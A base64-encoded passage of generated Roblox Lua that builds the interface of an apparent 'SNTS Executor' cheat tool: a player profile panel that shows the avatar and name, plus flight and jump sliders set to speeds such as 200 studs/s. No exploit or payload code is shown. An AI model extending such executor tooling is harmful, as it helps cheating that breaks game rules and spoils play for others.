lsaWVzL0dvdGhhbVNTbS5qc29uXV0sIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbIjFmIl1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDIwOCwgMjA4LCAyMDgpOwpHMkxbIjFmIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiMWYiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDIwMCwgMCwgNTApOwpHMkxbIjFmIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiMWYiXVsiVGV4dCJdID0gW1tEaXNwbGF5TmFtZV1dOwpHMkxbIjFmIl1bIk5hbWUiXSA9IFtbRGlzcGxheU5hbWVdXTsKRzJMWyIxZiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMTU1MTcsIDAsIDAuNjg0NDMsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5Qcm9maWxlLlVzZXJuYW1lCkcyTFsiMjAiXSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgRzJMWyIxYyJdKTsKRzJMWyIyMCJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiMjAiXVsiVGV4dFNpemUiXSA9IDE3OwpHMkxbIjIwIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjIwIl1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiMjAiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoODYsIDg2LCA4Nik7CkcyTFsiMjAiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyIyMCJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjAwLCAwLCA1MCk7CkcyTFsiMjAiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIyMCJdWyJUZXh0Il0gPSBbW1VzZXJuYW1lXV07CkcyTFsiMjAiXVsiTmFtZSJdID0gW1tVc2VybmFtZV1dOwpHMkxbIjIwIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4xNTE2NCwgMCwgMC44MDMyOCwgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLlByb2ZpbGUuUHJvZmlsZVBpY3R1cmVGcmFtZQpHMkxbIjIxIl0gPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiLCBHMkxbIjFjIl0pOwpHMkxbIjIxIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyIyMSJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIyMSJdWyJJbWFnZSJdID0gW1tyYnhhc3NldGlkOi8vODI3MjA3MDQ1MTExODFdXTsKRzJMWyIyMSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMTgwLCAwLCAxODApOwpHMkxbIjIxIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiMjEiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyIyMSJdWyJOYW1lIl0gPSBbW1Byb2ZpbGVQaWN0dXJlRnJhbWVdXTsKRzJMWyIyMSJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMTg3OTUsIDAsIC0wLjAwMjI2LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuUHJvZmlsZS5Qcm9maWxlUGljdHVyZUZyYW1lLlVJQ29ybmVyCkcyTFsiMjIiXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbIjIxIl0pOwpHMkxbIjIyIl1bIkNvcm5lclJhZGl1cyJdID0gVURpbS5uZXcoMCwgMTAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuVUlHcmFkaWVudApHMkxbIjIzIl0gPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiLCBHMkxbIjFiIl0pOwpHMkxbIjIzIl1bIlJvdGF0aW9uIl0gPSAtOTA7CkcyTFsiMjMiXVsiQ29sb3IiXSA9IENvbG9yU2VxdWVuY2UubmV3ewoJQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNTgsIDAsIDApKSwKCUNvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4yNjEsIENvbG9yMy5mcm9tUkdCKDgwLCAwLCAwKSksCglDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuNjE4LCBDb2xvcjMuZnJvbVJHQigxMjAsIDAsIDApKSwKCUNvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45ODgsIENvbG9yMy5mcm9tUkdCKDE3MSwgMCwgMCkpLAoJQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk5NywgQ29sb3IzLmZyb21SR0IoMTk4LCAwLCAwKSksCglDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEuMDAwLCBDb2xvcjMuZnJvbVJHQigyNTUsIDAsIDApKQp9OwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzCkcyTFsiMjQiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbIjFiIl0pOwpHMkxbIjI0Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyIyNCJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIyNCJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjg2LCAwLCAzMDApOwpHMkxbIjI0Il1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4xMjMwNCwgMCwgMC4zOTIxLCAwKTsKRzJMWyIyNCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjI0Il1bIk5hbWUiXSA9IFtbRGV0YWlsc11dOwpHMkxbIjI0Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CgoKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0g8J+njSBQbGF5ZXIgUHJvZmlsZSBGdW5jdGlvbiAoQWRkLW9uKQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnRhc2suc3Bhd24oZnVuY3Rpb24oKQoJbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCglsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyIG9yIFBsYXllcnMuUGxheWVyQWRkZWQ6V2FpdCgpCglsb2NhbCB1c2VySWQgPSBwbGF5ZXIuVXNlcklkCgoJLS0gdXBkYXRlIGF2YXRhciBoZWFkc2hvdAoJbG9jYWwgYXZhdGFySW1hZ2UgPSBHMkxbIjFkIl0KCWxvY2FsIHRodW1iVHlwZSA9IEVudW0uVGh1bWJuYWlsVHlwZS5IZWFkU2hvdAoJbG9jYWwgdGh1bWJTaXplID0gRW51bS5UaHVtYm5haWxTaXplLlNpemU0MjB4NDIwCglsb2NhbCBjb250ZW50LCBpc1JlYWR5ID0gUGxheWVyczpHZXRVc2VyVGh1bWJuYWlsQXN5bmModXNlcklkLCB0aHVtYlR5cGUsIHRodW1iU2l6ZSkKCWF2YXRhckltYWdlLkltYWdlID0gY29udGVudAoKCS0tIHNldCBiYWNrZ3JvdW5kIHRvIGJsYWNrIGluc3RlYWQgb2Ygd2hpdGUKCWF2YXRhckltYWdlLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKQoJYXZhdGFySW1hZ2UuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAKCgktLSB1cGRhdGUgZGlzcGxheSBuYW1lICsgdXNlcm5hbWUKCWxvY2FsIGRpc3BsYXlOYW1lID0gRzJMWyIxZiJdCglsb2NhbCB1c2VybmFtZSA9IEcyTFsiMjAiXQoKCWRpc3BsYXlOYW1lLlRleHQgPSBwbGF5ZXIuRGlzcGxheU5hbWUKCXVzZXJuYW1lLlRleHQgPSAiQCIgLi4gcGxheWVyLk5hbWUKZW5kKQoKCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuRmxpZ2h0CkcyTFsiMjUiXSA9IEluc3RhbmNlLm5ldygiRm9sZGVyIiwgRzJMWyIyNCJdKTsKRzJMWyIyNSJdWyJOYW1lIl0gPSBbW0ZsaWdodF1dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLkZsaWdodC5TbGlkZXJDb250YWluZXIKRzJMWyIyNiJdID0gSW5zdGFuY2UubmV3KCJDYW52YXNHcm91cCIsIEcyTFsiMjUiXSk7CkcyTFsiMjYiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjI2Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDM3LCAzNywgMzcpOwpHMkxbIjI2Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAxOTksIDAsIDUxKTsKRzJMWyIyNiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAsIC0xMCwgMCwgNTApOwpHMkxbIjI2Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiMjYiXVsiTmFtZSJdID0gW1tTbGlkZXJDb250YWluZXJdXTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5GbGlnaHQuU2xpZGVyQ29udGFpbmVyLlVJQ29ybmVyCkcyTFsiMjciXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbIjI2Il0pOwoKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5GbGlnaHQuU2xpZGVyQ29udGFpbmVyLlNsaWRlcgpHMkxbIjI4Il0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyIyNiJdKTsKRzJMWyIyOCJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiMjgiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKTsKRzJMWyIyOCJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMTY2LCAwLCA1MSk7IC0tIGFsaWduZWQgd2lkdGggd2l0aCBKdW1wL1NwZWVkCkcyTFsiMjgiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKTsKRzJMWyIyOCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjI4Il1bIk5hbWUiXSA9IFtbU2xpZGVyXV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuRmxpZ2h0LlNsaWRlckNvbnRhaW5lci5TbGlkZXIuVUlHcmFkaWVudApHMkxbIjI5Il0gPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiLCBHMkxbIjI4Il0pOwpHMkxbIjI5Il1bIlJvdGF0aW9uIl0gPSAtOTA7CkcyTFsiMjkiXVsiQ29sb3IiXSA9IENvbG9yU2VxdWVuY2UubmV3ewoJQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNjAsIDYwLCA2MCkpLAoJQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjI2MSwgQ29sb3IzLmZyb21SR0IoODAsIDAsIDApKSwKCUNvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC42MTgsIENvbG9yMy5mcm9tUkdCKDEyMCwgMCwgMCkpLAoJQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk4OCwgQ29sb3IzLmZyb21SR0IoMTcxLCAwLCAwKSksCglDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuOTk3LCBDb2xvcjMuZnJvbVJHQigxOTgsIDAsIDApKSwKCUNvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wMDAsIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkpCn07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuRmxpZ2h0LlNsaWRlckNvbnRhaW5lci5TbGlkZXIuU2xpZGVyVmFsdWVIYW5kbGVyCkcyTFsiMmEiXSA9IEluc3RhbmNlLm5ldygiTG9jYWxTY3JpcHQiLCBHMkxbIjI4Il0pOwpHMkxbIjJhIl1bIk5hbWUiXSA9IFtbU2xpZGVyVmFsdWVIYW5kbGVyXV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuRmxpZ2h0LlNsaWRlckNvbnRhaW5lci5EaXNwbGF5TmFtZQpHMkxbIjJiIl0gPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIEcyTFsiMjYiXSk7CkcyTFsiMmIiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjJiIl1bIlRleHRTaXplIl0gPSAxODsKRzJMWyIyYiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIyYiJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL0dvdGhhbVNTbS5qc29uXV0sIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbIjJiIl1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjJiIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiMmIiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDIwMCwgMCwgNTApOyAtLSBtYXRjaGVkIG90aGVycwpHMkxbIjJiIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiMmIiXVsiVGV4dCJdID0gW1s2MCBzdHVkcy9zXV07CkcyTFsiMmIiXVsiTmFtZSJdID0gW1tEaXNwbGF5TmFtZV1dOwpHMkxbIjJiIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoLTAuMDMwNjIsIDAsIC0wLjAwMTg1LCAwKTsgLS0gcGVyZmVjdCB2ZXJ0aWNhbCBhbGlnbm1lbnQKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5GbGlnaHQuVGV4dEJ1dHRvbgpHMkxbIjJjIl0gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iLCBHMkxbIjI1Il0pOwpHMkxbIjJjIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyIyYyJdWyJUZXh0U2l6ZSJdID0gMTsKRzJMWyIyYyJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIyYyJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigzNywgMzcsIDM3KTsKRzJMWyIyYyJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL1NvdXJjZVNhbnNQcm8uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuUmVndWxhciwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyIyYyJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgOTIsIDAsIDUwKTsgLS0gc2FtZSBhcyBvdGhlcnMKRzJMWyIyYyJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjJjIl1bIlRleHQiXSA9IFtbXV07CkcyTFsiMmMiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjcwNTEsIDAsIDAuMTcsIDApOyAtLSBtYXRjaGVkIEp1bXAgYnV0dG9uIGFsaWdubWVudAoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLkZsaWdodC5UZXh0QnV0dG9uLlVJQ29ybmVyCkcyTFsiMmQiXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbIjJjIl0pOwoKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5GbGlnaHQuVGV4dEJ1dHRvbi5EaXNwbGF5TmFtZQpHMkxbIjJlIl0gPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIEcyTFsiMmMiXSk7CkcyTFsiMmUiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjJlIl1bIlRleHRTaXplIl0gPSAxODsKRzJMWyIyZSJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIyZSJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL0dvdGhhbVNTbS5qc29uXV0sIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbIjJlIl1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjJlIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiMmUiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDkxLCAwLCA1MCk7IC0tIGNvbnNpc3RlbnQgd2lkdGgKRzJMWyIyZSJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjJlIl1bIlRleHQiXSA9IFtbRmxpZ2h0XV07CkcyTFsiMmUiXVsiTmFtZSJdID0gW1tEaXNwbGF5TmFtZV1dOwpHMkxbIjJlIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4wMDM0MiwgMCwgLTAuMDAyMjQsIDApOyAtLSBzYW1lIHRleHQgYWxpZ25tZW50IGFzIEp1bXAvU3BlZWQKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5KdW1wCkcyTFsiMmYiXSA9IEluc3RhbmNlLm5ldygiRm9sZGVyIiwgRzJMWyIyNCJdKTsKRzJMWyIyZiJdWyJOYW1lIl0gPSBbW0p1bXBdXTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5KdW1wLkp1bXBTbGlkZXJDb250YWluZXIKRzJMWyIzMCJdID0gSW5zdGFuY2UubmV3KCJDYW52YXNHcm91cCIsIEcyTFsiMmYiXSk7CkcyTFsiMzAiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjMwIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDM3LCAzNywgMzcpOwpHMkxbIjMwIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLCAwLjUpOwpHMkxbIjMwIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAxOTksIDAsIDUxKTsKRzJMWyIzMCJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAsIC0xMCwgMCwgMTk1KTsKRzJMWyIzMCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjMwIl1bIk5hbWUiXSA9IFtbSnVtcFNsaWRlckNvbnRhaW5lcl1dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLkp1bXAuSnVtcFNsaWRlckNvbnRhaW5lci5VSUNvcm5lcgpHMkxbIjMxIl0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyIzMCJdKTsKCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuSnVtcC5KdW1wU2xpZGVyQ29udGFpbmVyLkp1bXBTbGlkZXJGcmFtZQpHMkxbIjMyIl0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyIzMCJdKTsKRzJMWyIzMiJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiMzIiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKTsKRzJMWyIzMiJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMTY2LCAwLCA1MSk7CkcyTFsiMzIiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygtMCwgMCwgMCwgMCk7CkcyTFsiMzIiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIzMiJdWyJOYW1lIl0gPSBbW0p1bXBTbGlkZXJGcmFtZV1dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLkp1bXAuSnVtcFNsaWRlckNvbnRhaW5lci5KdW1wU2xpZGVyRnJhbWUuVUlHcmFkaWVudApHMkxbIjMzIl0gPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiLCBHMkxbIjMyIl0pOwpHMkxbIjMzIl1bIlJvdGF0aW9uIl0gPSAtOTA7CkcyTFsiMzMiXVsiQ29sb3IiXSA9IENvbG9yU2VxdWVuY2UubmV3e0NvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4wMDAsIENvbG9yMy5mcm9tUkdCKDYwLCA2MCwgNjApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMjYxLCBDb2xvcjMuZnJvbVJHQig4MCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC42MTgsIENvbG9yMy5mcm9tUkdCKDEyMCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45ODgsIENvbG9yMy5mcm9tUkdCKDE3MSwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45OTcsIENvbG9yMy5mcm9tUkdCKDE5OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wMDAsIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkpfTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5KdW1wLkp1bXBTbGlkZXJDb250YWluZXIuSnVtcFNsaWRlckZyYW1lLkp1bXBTbGlkZXJWYWx1ZUhhbmRsZXIKRzJMWyIzNCJdID0gSW5zdGFuY2UubmV3KCJMb2NhbFNjcmlwdCIsIEcyTFsiMzIiXSk7CkcyTFsiMzQiXVsiTmFtZSJdID0gW1tKdW1wU2xpZGVyVmFsdWVIYW5kbGVyXV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuSnVtcC5KdW1wU2xpZGVyQ29udGFpbmVyLkRpc3BsYXlOYW1lCkcyTFsiMzUiXSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgRzJMWyIzMCJdKTsKRzJMWyIzNSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiMzUiXVsiVGV4dFNpemUiXSA9IDE4OwpHMkxbIjM1Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjM1Il1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiMzUiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiMzUiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyIzNSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjAwLCAwLCA1MCk7CkcyTFsiMzUiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIzNSJdWyJUZXh0Il0gPSBbWzIwMCBzdHVkcy9zXV07CkcyTFsiMzUiXVsiTmFtZSJdID0gW1tEaXNwbGF5TmFtZV1dOwpHMkxbIjM1Il1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoLTAuMDMwNjIsIDAsIC0wLjAwMTg1LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5KdW1wLlRleHRCdXR0b24KRzJMWyIzNiJdID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIiwgRzJMWyIyZiJdKTsKRzJMWyIzNiJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiMzYiXVsiVGV4dFNpemUiXSA9IDE7CkcyTFsiMzYiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiMzYiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMzcsIDM3LCAzNyk7CkcyTFsiMzYiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Tb3VyY2VTYW5zUHJvLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LlJlZ3VsYXIsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiMzYiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDkyLCAwLCA1MCk7CkcyTFsiMzYiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIzNiJdWyJUZXh0Il0gPSBbW11dOwpHMkxbIjM2Il1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC43MDUxLCAwLCAwLjU2ODMzLCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5KdW1wLlRleHRCdXR0b24uVUlDb3JuZXIKRzJMWyIzNyJdID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIEcyTFsiMzYiXSk7CgoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLkp1bXAuVGV4dEJ1dHRvbi5VSUNvcm5lcgpHMkxbIjM4Il0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyIzNiJdKTsKCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuSnVtcC5UZXh0QnV0dG9uLkRpc3BsYXlOYW1lCkcyTFsiMzkiXSA9IEluc3RhbmNl